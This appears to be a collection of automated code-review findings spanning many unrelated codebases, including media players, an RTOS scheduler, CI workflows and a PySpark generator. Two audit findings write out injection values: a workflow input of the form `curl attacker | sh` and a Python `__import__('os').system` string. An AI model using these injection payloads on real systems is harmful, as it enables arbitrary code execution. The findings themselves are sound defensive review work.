candidate_findings.message: FillDataRequest casts RequestedLength (long) to int, allocates the whole requested range in one buffer, and does one Stream.Read without looping, then FinishLoading reports success. AVFoundation often sends RequestsAllDataToEndOfResource with RequestedLength set to the full file size. A stream over 2 GB overflows to a negative int, so `new byte[negative]` throws, the exception is swallowed, and FinishLoading() marks the request complete with no data. Smaller files still allocate the whole file at once. Any stream whose Read returns fewer bytes than requested (network or buffered wrappers) also serves a truncated range that is reported as complete.

FinishLoading() runs unconditionally even after FillDataRequest catches an exception, so read failures reach AVFoundation as successful empty responses instead of FinishLoadingWithError. A disposed or failing stream throws in Read. The catch only writes Debug output, then loadingRequest.FinishLoading() signals success. AVPlayer stalls or shows a generic decode failure, and MediaFailed never reports the real cause.

GetStreamContentType returns the 'public.mpeg-4' UTI for every stream that lacks an ftyp box, including MP3, WAV, FLAC and other audio streams. On iOS, MediaSource.FromStream(mp3Stream) tells AVFoundation the content is MPEG-4. It tries to parse the MP3 as an MP4 container and the item fails with an unknown or unsupported format error, while the same stream plays on Windows and Android.

When the new Source is a StreamMediaSource whose Stream is null, the old currentStreamDataSourceFactory is not cleared, and SetPlayerData falls through to return the stale `mediaItem` field. Set Source to StreamMediaSource A, then to a new StreamMediaSource whose Stream is null (for example, bound before it is assigned). The `is not StreamMediaSource` guard skips cleanup, CreateMediaItem returns the old builder, and the branch at line 648 builds a ProgressiveMediaSource from A's factory. The player restarts the previous stream instead of clearing.

AsRandomAccessStream() throws NotSupportedException for non-seekable streams, so StreamMediaSource crashes on Windows. Android explicitly supports non-seekable streams. Passing a network or decompression stream (CanSeek == false) to MediaSource.FromStream throws NotSupportedException from PlatformUpdateSource on Windows. The same code plays on Android, which handles the non-seekable case.

The previous StreamDataSourceFactory (a Java.Lang.Object passed to ExoPlayer) is disposed before the new media source replaces it on the player, and its StreamDataSource instances are never disposed. While switching between two StreamMediaSources, CreateMediaItemFromStream disposes the old factory and then awaits artwork. ExoPlayer still holds the old ProgressiveMediaSource, so a Java callback into the disposed peer can fail with 'No constructor found for StreamDataSourceFactory(IntPtr, JniHandleOwnership)'. The StreamDataSource instances keep the old Stream reachable.

The old StreamAssetResourceLoader is disposed before ReplaceCurrentItemWithPlayerItem swaps out the AVPlayerItem that still uses it as delegate on the background queue. Changing from one StreamMediaSource to another while the first is loading: the background dispatch queue can call ShouldWaitForLoadingOfRequestedResource on the disposed NSObject. That raises ObjectDisposedException or crashes natively before the player item is replaced.

The MP3 frame-sync check (0xFF, top 3 bits of byte 2 set) also matches AAC ADTS headers (0xFFF1/0xFFF9), and the MPEG-TS check fires on any stream whose first byte is 0x47 ('G'). A raw .aac ADTS stream is labelled audio/mpeg and handed to WinMediaSource.CreateFromStream with the wrong MIME type, which can make Media Foundation fail to open it. Any unknown payload starting with 'G' is reported as video/mp2t instead of application/octet-stream.

GetStreamContentType re-implements the magic-byte sniffing (position save/restore, ftyp brand parse) already in the shared StreamExtensions.GetMimeType added in the same PR. Two sniffers for the same job will drift. The macOS copy only knows MP4/QuickTime, which causes the audio misclassification above, and its finally block can throw from `stream.Position = originalPosition` where the shared version guards this. Call GetMimeType() and map the MIME type to a UTI instead.

StreamAssetResourceLoader.Dispose(bool) contains an empty `if (disposing)` block that holds only a comment and does nothing beyond the base call. This is dead code that suggests cleanup happens when it does not. Remove the override; the comment about stream ownership belongs on the class or constructor. GetStreamContentType similarly ends with a hard-coded "public.mpeg-4" literal instead of DefaultContentType.

Dropping the `scripts/ao-update.sh` check means any path with a `.git` four levels up is classified as a git install. Because the bundled update script is now always present, `ao update` then runs the source-update flow against whatever repo that is. The CLI's dist is vendored or copied into some other repo (e.g. `tools/ao/dist/lib`, with `.git` four levels up). `detectInstallMethod()` returns "git", `hasRepoScript` is true because dist/assets ships, and ao-update.sh runs `git fetch/pull --ff-only origin main`, `pnpm install` and the `pnpm --filter ... clean` steps inside an unrelated repository.

The default REPO_ROOT (`$(dirname BASH_SOURCE)/..`) is wrong after the move. It now resolves to `packages/cli/src/assets` (or `dist/assets`) instead of the repo or package root, in both ao-update.sh and ao-doctor.sh (line 31). Running `bash packages/cli/src/assets/scripts/ao-update.sh` directly, without AO_REPO_ROOT, cds into `packages/cli/src/assets`. `git rev-parse` still passes, `pnpm install` runs from a subdirectory, and `cd $REPO_ROOT/packages/ao` fails. ao-doctor.sh run directly reports missing node_modules and launcher. Its layout auto-detect also misfires because `dist/assets` has no package.json.

`hasRepoScript` checks for the bundled asset, which `cp -r src/assets dist/` ships in every layout. The fallback therefore only fires on a broken build, and it never detects the real problem: no usable source checkout. For any git-detected install the check is always true, so the new npm fallback is effectively dead code. The test only passes because it mocks `hasRepoScript` to false. The check that matters is whether `resolveScriptLayout()` is package-install or REPO_ROOT has `.git`/`packages/ao`, and that check is missing.

The fallback hardcodes "npm-global" and goes through handleNpmUpdate, which prints '--skip-smoke and --smoke-only only apply to git source installs. Ignoring.' even though this install was detected as a git install. A pnpm user or a source-checkout user who hits the fallback is told to run `npm install -g @aoagents/ao@latest`. That does not update the checkout their linked `ao` runs from, so the update looks like it succeeded but the running version stays the same. `ao update --skip-smoke` also prints a contradictory warning.

The packaged-install doctor test always sets AO_SCRIPT_LAYOUT explicitly, so the shell's layout auto-detect heuristic (package.json + dist/index.js + no packages/) is never tested. A regression in the auto-detect branch at ao-doctor.sh:32-38, or the stale default REPO_ROOT that makes it misfire, ships without any test failing.

In package-install mode, `dist/index.js` is checked in both check_install_layout and check_runtime_sanity. Checking for `dist/assets/scripts/ao-doctor.sh` is also pointless, since that is the script currently running. If the entrypoint is missing, the user sees two identical FAILs and FAIL_COUNT is inflated. The bundled-doctor PASS line is always printed and adds no information.

`resolveScriptLayoutFromPath` and `resolveDefaultRepoRootFromPath` re-implement the node_modules detection and `../../../../` repo-root walk that `classifyInstallPath` in update-check.ts already does. There are now two independent definitions of 'package install' and 'repo root' (update-check and script-runner). They can drift apart, so `ao update` could pick the git flow while script-runner reports package-install, or the reverse.

The new tests hardcode POSIX absolute paths and compare them to `path.resolve()` output, which is platform-dependent. Meanwhile the implementation explicitly handles Windows `\node_modules\` paths. On a Windows CI runner, `resolve('/usr/local/lib/node_modules/@aoagents/ao-cli/dist/lib', '../..')` returns `C:\usr\local\...`, so the toBe assertions fail.

The missing-script error repeats the scripts directory even though it is just the dirname of the 'Expected at' path, and the directory is recomputed instead of reusing getScriptPath's base. The error message is longer with no extra information, and the `assets/scripts` path is now built in two places that have to stay in sync.

The type is imported with an inline `type InstallMethod` specifier inside a value import, not the `import type { Foo }` form that the repo CLAUDE.md names. Repo CLAUDE.md, Code Style section: "Consistent type imports — `import type { Foo }` enforced by ESLint". The line `type InstallMethod,` inside `import { ... } from "../lib/update-check.js"` doesn't use that form.

trackUpdate now calls savePartitionMeta() when partitionMeta is null, but webSocketMessage never awaits loadFromStorage, so after a hibernation wake it writes a brand-new single-partition meta over the stored one. DO hibernates with partition_meta={partitions:[2026-Q2,2026-Q3]}; it wakes on webSocketMessage (no fetch, so loadFromStorage never runs), partitionMeta is null, trackUpdate builds {partitions:[2026-Q4]} and saves it right away. Older partitions drop out of meta and can no longer be requested or loaded.

The MSG_YJS_UPDATE path pushes to and saves the updates buffer without awaiting yjsSync.loadUpdates(), so after a hibernation wake the 5s save overwrites the persisted yjs_updates with only the new updates. DO is evicted while sockets stay hibernated; a client sends an update, updates=[] and loaded=false, pushUpdate appends one entry, and scheduleSave puts JSON of [that one update] to 'yjs_updates'. All earlier board history is gone, and SYNC_STEP1 also returns an empty set.

saveScheduled now resets in finally, after storage.put resolves, instead of when the timer fires, so a scheduleSave() call made while the put is in flight returns early and no follow-up save is ever scheduled. The timer fires and put() starts serializing; while it awaits, clients send updates U1..Un. Each scheduleSave sees saveScheduled=true and returns. finally clears the flag, but U1..Un are never saved unless another update arrives later. If the DO is evicted, those edits are lost.

The new per-partition saveScheduled flag clears only in finally after the put completes, so trackUpdate calls during the in-flight put skip scheduling and their updates are never written. An update arrives while storage.put(`yjs_updates:2026-Q4`) is awaiting. schedulePartitionSave returns early because the flag is still true, and once the flag clears nothing reschedules. The latest partition updates stay in memory only and are lost on eviction.

applyClientUpdate returns true without validating when no Y.Doc exists yet, so the new 'skip corrupt update' guard in board-room only works after some HTTP path has created the doc. In a fresh room where no thumbnail, AI, or snapshot call has run, doc is null. A malformed payload returns true, gets pushed to the buffer, broadcast to every peer, and persisted. Peers then hit decode errors, and getOrCreateDoc later has to skip it.

ShapeLayer applies a CSS rotate to every shape, but only some plugins wrap hitTest in withRotation. Frame, group, connector, freedraw, counter, board-portal, island, community-chat and community-region still hit-test the unrotated box. A frame or freedraw shape with rotation=45 renders rotated, but clicks on its visible rotated corners miss while clicks in empty space inside the unrotated box select it. Applying the rotation once in the registry or hit-test dispatcher (or in tool-select's caller) would cover every plugin without per-plugin opt-in.

collision-utils keeps its own shapeToBounds that ignores rotation, while board-store's shapeToBounds now uses getRotatedAABB, so frame containment and intersection checks disagree with the spatial index. A rotated shape whose rotated AABB extends past a frame is still reported as fully contained by findContained or findContainers, and intersection checks miss rotated overlaps. Share one rotation-aware shapeToBounds helper (export it from shared) and call it from both places.

GPU primitives pass raw data.rotation (not run through safeRotation) for rect and ellipse, the rect shader never reads params.w, and lineGpuPrimitive omits rotation entirely, so the GPU path draws shapes unrotated while hit-testing treats them as rotated. With the GPU renderer active, a rectangle or line at rotation=30 draws axis-aligned, but withRotation hit-tests the rotated outline, so clicks on the visible shape can miss. A NaN rotation is also written straight into the instance buffer.

deltaToLocal re-implements the same cos/sin rotation as rotatePoint instead of calling rotatePoint(delta, {x:0,y:0}, -rad). Two copies of the rotation formula have to stay in sync. If the sign convention changes in one (for example clockwise vs counter-clockwise), resize-under-rotation and hit-testing quietly diverge.

snapAngle divides by step without a guard, so step=0 returns NaN (and a negative step behaves oddly). That NaN then flows into rotation, where safeRotation silently resets it to 0. A caller with a configurable snap step set to 0 (snapping disabled) calls snapAngle(37, 0) and gets NaN. The shape's rotation is stored as NaN and renders as 0, so the user's rotation is silently discarded.

The new vTaskSwitchContext() guard refuses every context switch while the current task has xPreemptionDisable set, including voluntary switches where that task has just blocked, suspended itself, or deleted itself and is no longer in a ready list. A task calls vTaskPreemptionDisable(NULL), then xQueueReceive(q, &x, portMAX_DELAY) on an empty queue. vTaskPlaceOnEventList moves it to the delayed/event lists and taskYIELD_WITHIN_API() runs, but vTaskSwitchContext only sets xYieldPendings and returns. The task keeps running, loops in xQueueReceive, and calls vTaskPlaceOnEventList again with its xEventListItem already in xTasksWaitingToReceive, which corrupts the list. vTaskDelay returns at once, and vTaskDelete(NULL)/vTaskSuspend(NULL) leave a deleted or suspended task running.

When a switch is refused, pxCurrentTCBs[xCoreID]->xTaskRunState stays taskTASK_SCHEDULED_TO_YIELD (set by prvYieldCore from another core). prvCheckForRunStateChange() then spins forever, because the yield it waits for is always refused. Core 1 runs task T with preemption disabled. Core 0 calls vTaskSuspend(T), vTaskDelete(T), vTaskCoreAffinitySet(T, mask without core 1), or a priority-disinherit path. Each calls prvYieldCore(1) without checking xPreemptionDisable, so it sets T->xTaskRunState = taskTASK_SCHEDULED_TO_YIELD and sends an IPI. Core 1's vTaskSwitchContext refuses. The next time T calls taskENTER_CRITICAL() or vTaskSuspendAll(), prvCheckForRunStateChange loops on `while (xTaskRunState == taskTASK_SCHEDULED_TO_YIELD)`: it enables interrupts, the yield is refused again, and it loops forever. Core 1 hangs, and a deleted task is never reaped (idle waits for taskTASK_NOT_RUNNING).

The new `xYieldPendingBefore == pdFALSE` condition makes these APIs return pdFALSE whenever a yield was already pending on the calling core, even if a higher-priority task now needs that core. Callers that use only this call's return value lose the yield. An ISR runs `xSemaphoreGiveFromISR(s, NULL);` (sets xYieldPendings[core]) and then `xYieldRequired = xTaskResumeFromISR(hHighPrio); portYIELD_FROM_ISR(xYieldRequired);`. xTaskResumeFromISR now returns pdFALSE because the flag was already set, so the ISR exits without switching. The high-priority task waits until the next tick or critical-section exit. Before this change it returned pdTRUE. The same applies to xTaskRemoveFromEventList (queue/semaphore FromISR wrappers) and to the notify FromISR functions when callers pass separate xHigherPriorityTaskWoken variables.

After a refused switch, the task's run state stays taskTASK_SCHEDULED_TO_YIELD. When vTaskPreemptionEnable() is called from another core, prvYieldCore() sees that state and skips portYIELD_CORE, so the deferred yield the comment promises does not happen at enable time. Core 1's task T has preemption disabled, and a remote yield request is refused (state = SCHEDULED_TO_YIELD, xYieldPendings[1] = pdTRUE). Core 0 calls vTaskPreemptionEnable(T). prvYieldCore(1) does nothing because `xTaskRunState != taskTASK_SCHEDULED_TO_YIELD` is false. T keeps running past its preemption-enable point until the next tick or until T itself exits a critical section, which delays higher-priority work.

Setting xYieldPendings[xCoreID] = pdTRUE on every refused switch makes the flag sticky while preemption is disabled. Every taskEXIT_CRITICAL() by that task then calls portYIELD() into vTaskSwitchContext, which refuses and sets the flag again. A preemption-disabled task that does many short critical sections (queue ops, list manipulation) takes a full yield trap with a context save/restore and both kernel locks on every critical exit, for nothing. This adds large latency and lock contention on the SMP task/ISR locks for the whole preemption-disabled region.

Inferring 'did prvYieldForTask yield this core' by comparing xYieldPendings before and after is copy-pasted into four functions. It patches the symptom of using a shared, possibly stale global as a return channel. There are four near-identical blocks (xTaskResumeFromISR, xTaskRemoveFromEventList, xTaskGenericNotifyFromISR, vTaskGenericNotifyGiveFromISR), and any new caller has to remember the same idiom. The deeper fix is to have prvYieldForTask() return BaseType_t, pdTRUE when it called prvYieldCore() on the calling core. Callers then use that result directly, which also fixes the false negative when the flag was already set.

The 'safety net' sits in vTaskSwitchContext, a shared path used by both preemptive and voluntary switches. Preemption-disable should only block involuntary switches, so the guard is at the wrong depth. Because vTaskSwitchContext cannot tell a voluntary block from a preemption, the guard breaks blocking APIs (see the related findings). The general fix is to keep the current task in prvSelectHighestPriorityTask only while it is still runnable (its xStateListItem is in pxReadyTasksLists and it is not being deleted or suspended). The alternative is to rely on the existing xPreemptionDisable checks at every prvYieldCore call site (vTaskSuspend, vTaskDelete, vTaskCoreAffinitySet, disinherit), some of which are still missing.

The commit changes scheduling behaviour in five places, but no test covers time-slicing with a preemption-disabled task, FromISR wake reporting, or blocking/suspending while preemption is disabled. The regressions listed above (a refused voluntary block, a hang in prvCheckForRunStateChange, a lost yield from xTaskResumeFromISR) would get through CI. A unit/SMP test that disables preemption, then blocks on a queue, and also resumes a task from an ISR with a pre-set pending flag would catch them.

Each new block calls portGET_CORE_ID() twice, and prvYieldForTask calls it again internally. On ports where it reads a system register or MMIO, this is repeated work inside the critical section. There are three core-ID reads per wake in hot ISR/queue paths, in four functions. Caching `const BaseType_t xCoreID = portGET_CORE_ID();` once, or better, using a return value from prvYieldForTask, removes the redundant reads and the duplicated pattern.

The generated ENTROPY expression puts `.otherwise(F.lit(0.0))` on the result of `F.sum(...)` instead of on the `F.when(...)`, so the generated script fails as soon as Spark builds that column. Any pipeline with an ENTROPY distributional metric (the `_pipeline_full` fixture has one) emits `F.sum(F.when(cv > 0, ...)).otherwise(F.lit(0.0))`. PySpark raises "otherwise() can only be applied on a Column previously generated by when()" while running the Layer 2B step. The tests miss it because they only run ast.parse on the output.

MODE is generated as `F.first(cat_col, ignorenulls=True)`, which returns an arbitrary category rather than the one with the largest aggregated value. An entity has region A with 100 and region B with 5 in one month. After the shuffle in groupBy, `F.first` can return B, and the result can change from run to run. The fix is something like `F.max_by(F.col(cat), F.col(cat_val))`.

CREC is emitted as `(x - lag(x)) / F.when(lag(x) != 0, lag(x))`, but TemporalOutputContract allows CREC on FECHA (date) columns, where comparing a date to 0 and dividing by a date are type errors. A FECHA measurement aggregated with MAX produces a TEMPORAL Layer 2 column. The builder then creates a CREC feature for it, and Spark raises an AnalysisException on `date != 0` and `interval / date` when Layer 3 runs.

PROM_P produces the same expression as PROM_U, SUM_P the same as SUM_U, and XM the same as FREQ. RATIO is emitted as a plain windowed SUM, so these features are silent duplicates or wrong values. With time_windows=[3], `x__PROM_P__BACKWARD__3` and `x__PROM_U__BACKWARD__3` are byte-for-byte the same column. With composed_windows set, every `__RATIO__` feature holds a sum rather than a ratio, so downstream models train on mislabelled features.

Categorical values, column names and aliases are pasted into generated Python as `"..."` without escaping (only `__` is validated), while other spots use `!r`. A quote or backslash in a value breaks the script or injects code. `CategoricalField("s", PIVOT, allowed_values=['A"B'])` produces `(F.col("s") == "A"B")` and the alias `"SUM__mto__s_A"B"`, so the script is a SyntaxError. A crafted value such as `x") or __import__("os").system("...") or ("` runs arbitrary code when the script is executed.

FREQ, XM and REC treat any non-null value as activity. A COUNT pivot gives 0 (not null) for periods with facts but no matching category, and SUM can be 0, so inactive periods are counted as active. An entity has transactions every month but never in sector A. `COUNT__mto__sector_A` is 0 every month, so FREQ over 3 months returns 3 and REC returns 0, both reporting full recent activity for a category the entity never used.

`_temporal_pyspark_expr` ends with a catch-all that returns the raw column under the feature's alias, while `_distributional_agg_expr` raises ValueError. Any unhandled or new operator silently produces a mislabelled copy of the source column. If a new TemporalOperator is added to the enum, or an existing branch is mistyped, the generator emits `F.col(src).alias("x__NEWOP__BACKWARD__3")` with no error, so the feature table contains a wrong column under a plausible name.

Plan 16 says the generator should produce a callable that takes a SparkSession. The output is instead a flat script that uses an undefined global `spark`, imports SparkSession without using it, and runs eager `saveAsTable` writes, despite the docstring's "all lazy" claim. Running the saved `script.py` with `spark-submit` or `python` outside a Databricks notebook fails with NameError: name 'spark' is not defined. Nothing in the output can be called with a session, as Plan 16's acceptance criteria require.

There is dead and duplicated code. The `col_ref` ternary has two identical branches and needs the DistributionalColumn import only for that. `_spark_read` is defined but never used (every step inlines `spark.read.table`). `id_select`/`id_partition` and `group_cols`/`id_time_cols`/`join_id_cols` are the same strings. `generate()` re-imports PySparkOutput as `_PS`, relies on `assert`, and widens the return type to `object`. Readers have to check that look-alike branches and variables really are the same, and edits to one copy can drift from the others. The `assert`s disappear under `python -O`. The `-> object` return type means type checkers lose the FeatureStoreOutput type for callers. Overriding `_combine_code` to add `_HEADER` would avoid all of this.

`isRegistered` is async but isn't awaited, so `!promise` is always false and the 'not registered' guard never fires. A staff member scans the QR code of a participant who never registered for the event. The check passes because a Promise is truthy, and the participant is checked in.

`User.findBy` can return null when a ParticipantProfile has no linked user, but the code then uses `user!.id` in isCheckedIn and checkin. A scanned slug matches an orphaned participant profile. `user` is null and `user.id` throws a TypeError, giving a 500 instead of a flash error.

The component returns early when `!isOpen` and only then calls `useTuyau` and `useForm`, which breaks React's Rules of Hooks. When `isOpen` goes from false to true, the component renders more hooks than on the previous render. React throws 'Rendered more hooks than during the previous render' and the dialog crashes.

With `allowMultiple` and `scanDelay={0}`, the scanner calls onScan on every frame, so each QR code sends many concurrent check-in POSTs. Several requests pass `isCheckedIn` concurrently and then call attach. The unique(event_id,user_id) constraint fails, causing 500s and error toasts. Later requests show 'Participante já checked-in' even though the check-in succeeded.

Rejections such as 'not found', 'not registered' and 'already checked in' flash errors and redirect back, but with Inertia the client may show the success toast and close the dialog when errors aren't exposed under the expected key. `session.flashErrors({message})` relies on Inertia sharing `errors.message`. If errors aren't shared as props, `onSuccess` runs and staff see 'Check-in successful!' for a failed check-in.

The staff QR button is rendered inside the `!isRegistered` block, so staff who are registered for the event never see the scanner trigger. A staff account that is also registered for the event opens the event page. The register block is hidden, so the QR icon is hidden too and they can't check anyone in.

Moving the `isStaff` check first makes any user with a staff profile report role 'staff', even if they also have a participant or promoter profile. A participant who becomes staff now has role 'staff'. Role-gated UI such as the promoter-only page.tsx and participant flows changes for them, and UserPolicy grants staff permissions based on role alone.

New seeders run in every environment. One turns user id 1 into staff (and fails if that user doesn't exist). 8_staff_seeder inserts Department id 99 and a fixed email, so it fails on re-run. Running `node ace db:seed` against a production-like DB promotes user 1 to staff. Running it on a fresh DB makes `findOrFail(1)` throw. A second seed run violates the unique constraints on department id and email.

`checkin` calls `event.save()` after attaching a pivot row even though the event model wasn't modified, which adds a pointless query. The `load('staffProfile')` added to `show` is also unused now that isStaff uses staffProfileId. Every check-in and every event page view runs an extra DB round-trip that has no effect.

The check-in route uses `/:slug` under `/events` (where `:id` means the event) and takes the event from an unvalidated body field `eventID`. It also uses ParticipantProfile slug as a stopgap (FIXME) instead of a validator and a `/:id/check-in/:slug` shape. `/events/:slug/check-in` can be confused with `/:id` routes. A missing or garbage `eventID` raises a 404 from findOrFail that the dialog shows as a generic error. The unvalidated input bypasses the codebase's VineJS validation pattern.

The 'Resolve source workflow run ID' step declares the `env:` mapping twice, and GitHub Actions rejects workflow files with duplicate YAML keys. GitHub fails to parse the workflow file ('env' is already defined), so the remediation workflow never runs, whether triggered by workflow_run or workflow_dispatch.

The shell conditional reads `if … elif … else … else … fi` with two `else` branches, which is a bash syntax error. The first `else` block looks like an older copy left behind when the same-week fallback was added. Bash parses the whole `if` compound before running any of it, so the step fails with "syntax error near unexpected token `else'" on every trigger, including the workflow_run path that only needs to echo the event's run id.

The nested heredocs inside the if-block keep 2 spaces of indentation after the YAML block dedent. The `  PY` terminators therefore never close the `<<'PY'` heredoc, and the Python body would start with indented lines. After YAML strips 10 spaces, the line reads `  PY`, which does not match the delimiter `PY`. Bash reads to EOF and reports 'unexpected end of file'. Even with the terminator fixed, `python -` would hit `IndentationError: unexpected indent` on `  import datetime`.

The manual-dispatch fallback filters runs with `branch=pre-update-release`. Scheduled runs of the weekly scan run on the default branch (main) and only check out pre-update-release internally, so their head_branch never matches. A manual dispatch without run_id gets no runs in the 7-day window or in the fallback query and exits with "No successful runs found for workflow 'Weekly Grype Security Scan' on branch 'pre-update-release'", even though successful weekly scans exist.

The tracking issue is only created or updated when there are recommendations. When a later scan reports nothing fixable, the existing open issue is never updated or closed. Week 1 opens the issue listing fixable packages. Week 2's scan is clean, so has_recommendations is 'false' and the step is skipped. The issue keeps showing week 1's outdated list as if it were current.

The artifact zip download passes the `Authorization: Bearer` header to `archive_download_url`. That URL 302-redirects to pre-signed blob storage, and urllib's redirect handler forwards the header there. The blob storage host gets both a SAS-signed URL and a Bearer Authorization header and can reject the request (400/403 AuthenticationFailed), so the artifact download step fails.

The regression gate compares only High/Critical counts, so a PR that fixes one Critical CVE and introduces a different one passes as 'no regression'. The base has CVE-A (Critical). The Dependabot bump fixes CVE-A but pulls in a package with CVE-B (Critical). Both counts are 1, so critical_regression is False and the new Critical CVE merges. Comparing sets of (vuln id, package) would catch it.

The job is gated on `github.actor == 'dependabot[bot]'`, but `github.actor` is whoever triggered the run, not the PR author. When a maintainer re-runs the check or pushes a fixup commit to a Dependabot PR, the actor is the maintainer. The guard job is skipped and reports as success, so the PR can merge without the Grype gate. Use `github.event.pull_request.user.login` instead.

`${{ inputs.run_id }}` is interpolated directly into the shell script and then into the API URL, with no validation that it is numeric. A dispatcher who enters `1"; curl attacker | sh; echo "` gets arbitrary commands run with a token that has issues:write. A value that is merely malformed produces a confusing API 404. Pass it through env and check that it is numeric.

The 'Highest severity' column falls back to 'Low' for anything that isn't Critical, High, or Medium, so Negligible and Unknown fixable vulns are shown as Low. A package whose only fixable vuln has severity 'Unknown' (common for new CVEs not yet scored) appears as 'Low' in the issue table and gets deprioritized, even though its real severity is not known.

prepareForValidation no longer emits ownerName, but companySchema (schemas.ts:153) still requires it, so validation always fails and the error maps to no visible field. User edits a company in the detail sidebar and clicks Save → safeParse fails on ownerName ('Owner name is required'), fieldExistsInConfig('ownerName') is false so no error is shown, validateAllFields returns false, and onSave is never called. Save silently does nothing.

The ownerName field was removed from companyFields, but CreationForm is still given companySchema, which requires ownerName. User fills in name/address/location/type and submits → schema.safeParse(formData) fails with errors.ownerName, there is no input to show it on, and handleSubmit returns early. The form can never be submitted.

on:keydown|stopPropagation on .modal-content stops keydown from reaching the <svelte:window> Escape handler whenever focus is inside the dialog. User clicks the map or tabs to the close button (focus moves into the tabindex=0 dialog) and presses Escape → the event is stopped at modal-content, handleKeydown never runs, and the modal stays open.

View mode for location reads data[field.key], while every other field reads the editable copy through getFieldValue, so the location shown after a save is stale. User edits location to a new POINT and saves (isEditing=false, editable updated) → other fields show the new values, but the location link/map still opens the old coordinates from `data` until the parent refreshes. If the old value was empty, the link stays hidden.

Company names from the API are passed through titleCase, which lowercases everything after the first letter of each word, so displayed (and later edited/saved) names no longer match the backend. Backend name 'KSRTC' or 'ABC Pvt. Ltd' displays as 'Ksrtc' / 'Abc Pvt. Ltd'. The detail sidebar seeds `editable` from this value, so saving any edit writes the mangled name back to the server.

The shared DynamicDetailSidebar now special-cases field.key === 'location' for every entity, even though this same diff adds a view-mode `field.renderer` path (and widens DetailFieldRenderer) that no config uses. Any other entity with a field keyed 'location' (e.g. a future bus stop or depot config) silently gets the company map-link UI. The new renderer branch is dead code. The company config should set `renderer: LocationField` and the key check should be dropped.

parseWKTPoint re-implements WKT parsing with a loose regex, while the codebase already parses WKT everywhere with ol/format/WKT (MapOL.svelte, openlayers.utils.ts). The regex accepts malformed numbers like '1.2.3' or '--5' (parseFloat silently truncates them) and rejects valid WKT such as 'POINT Z (...)' or exponent notation. Using `new WKT().readGeometry(...)` from the existing utilities avoids keeping a second parser in sync.

createSource and escapeHtml are copy-pasted from MapOL.svelte, and the copy drops `crossOrigin: 'anonymous'`. Two tile-source factories now have to be kept in sync. Custom XYZ providers behave differently in this map than in MapOL (no CORS mode → tainted canvas). These should be extracted into openlayers.utils.ts and shared.

The parent already gates the modal with {#if showLocationMap}, so the localOpen/isOpen sync, openLocationMap's false→setTimeout→true toggle, and the duplicate 100ms updateSize timers (modal + CompanyLocationMap) are redundant. CircleStyle/Fill/Stroke imports and the .location-display CSS are unused. Extra state and timers make open/close behavior harder to reason about: three async hops just to show a modal. Svelte also emits unused-selector warnings, and the unused OL modules add bundle noise. Setting showLocationMap = true directly and rendering on `{#if}` alone does the same job.

fetchCompanies duplicates the requestId/hasNextPage/totalItems/empty-page-retry logic from landmark, executive-role and executive-account pages almost line for line, but this copy omits `hasMore={hasNextPage}` on Pagination. There are now four copies of the same pagination state machine, and they are already drifting (company passes no hasMore and relies only on the +1 totalItems hack). A shared paginated-fetch helper would keep a bug fix in one place from being missed in the others.

The notebook calls `wg_fin.load_artifacts` and `wg_fin.run_inference`, but neither function exists in `financial_impact/financial.py`. The `load_artifacts` AttributeError gets caught by the broad `except Exception`, so the notebook always takes the fallback branch. That branch then calls `wg_fin.run_inference(...)`, which raises AttributeError and is re-raised. The pipeline cell can never finish, and no reports get written.

`repo_root` is hardcoded to `/Users/<author>/Desktop/Capstone/waferguard-ml`, and it is added to `sys.path` only after `from financial_impact import financial` has already run. On any other machine (or with the notebook's cwd at `wafer_images/`), the import fails with ModuleNotFoundError, because the path insert comes later. Even when the import works, data, model, and report paths all point at another person's Desktop. Result: FileNotFoundError, or reports written outside the repo.

`compute_financials` accepts a `financial_params` override, but the loop calls `get_params(binary_label)`, which always reads the module-level `FINANCIAL_PARAMS`. A caller (for example a Streamlit what-if UI) passes custom repair or downtime costs. The function silently uses the defaults, so the report shows the wrong losses, EVoA, and priorities with no error.

When `df_batch` is empty, `rows` is empty and `pd.DataFrame([]).sort_values("priority_score")` raises KeyError. That makes the later `if not df_financial.empty` / `if not df_batch.empty` guards unreachable. An empty batch (zero uploaded wafers, or everything filtered out) makes `build_batch_df([])` return an empty DataFrame. `compute_financials` then crashes with KeyError: 'priority_score' instead of returning a zero summary.

`summary_payload["avg_confidence"]` is `df_batch["avg_confidence"].mean()`, which averages the per-pattern averages and does not weight them by wafer count. Example batch: 10,000 Normal wafers at 0.99 confidence plus 1 Scratch wafer at 0.40. The reported batch average is 0.695 when it should be about 0.99, and it falls below the 0.70 review threshold.

`yield_range` uses `int(params['ylo'] * 100)`, which truncates float error instead of rounding. For combo patterns, `get_params` gives values like yhi=0.58 or 0.29. `int(0.58*100)` is 57 and `int(0.29*100)` is 28, so the report shows '…-57%' when it should show '…-58%'.

`decode_labels` maps any class id missing from `id_to_binary` to "00000000" (Normal), so mapping gaps hide defects as zero-loss wafers. In the artifacts branch, `artifacts.get("id_to_binary", {})` can be empty or incomplete. Every wafer is then labeled Normal, and the report shows $0 daily loss and 'None' as top action for a batch that actually has defects.

The diff deletes the `PresentationPDFs/` and `architecture_report.pdf` ignore rules, adds `requirements.txt` to the ignore list, and ignores only the JSON report while the CSV reports in the same directory stay tracked. After this merge, `git add .` stages the large presentation PDFs and the architecture report. A requirements.txt meant for deploying the Streamlit app will never be committed. The generated `financial_report_LOT_001.csv` and `batch_frequency_LOT_001.csv` show up as untracked files. Ignoring `reports_*/` would cover all of them.

`build_batch_df` rebuilds `confs_this` by scanning every label once per distinct pattern, which is O(N×K) Python-level work. The notebook runs on the full dataset (about 38k wafers × up to 38 patterns), which means about 1.4M Python iterations just to group. A single `pd.DataFrame({...}).groupby('binary_label')['conf'].agg(['count','mean','min','max'])` does the same job in vectorized form.

The notebook hardcodes a 38-entry `label_mapping` and rebuilds the id↔pattern dicts, when `app/labels.py` already defines `ID_TO_PATTERN` and `PATTERN_TO_ID` in the same ordering. There are now two separate copies of the class-id ↔ pattern mapping. If the app's mapping changes (retraining, a new class), the notebook keeps decoding with stale ids and silently mislabels wafers in the financial report.

`appleApiKeyId` is a local `let` that starts as undefined and has no matching CLI option, so non-interactive iOS API-key creation always fails at the 'You must provide the Apple API Key ID' check. CI runs `apps:destinations:create --platform ios --apple-api-key-file key.p8 --apple-issuer-id X --apple-team-id T`. The .p8 file is uploaded, then `!appleApiKeyId` is true, isInteractive() is false, and the process exits 1. API-key auth can't be scripted at all. (`update.ts` does expose `--apple-api-key-id`.)

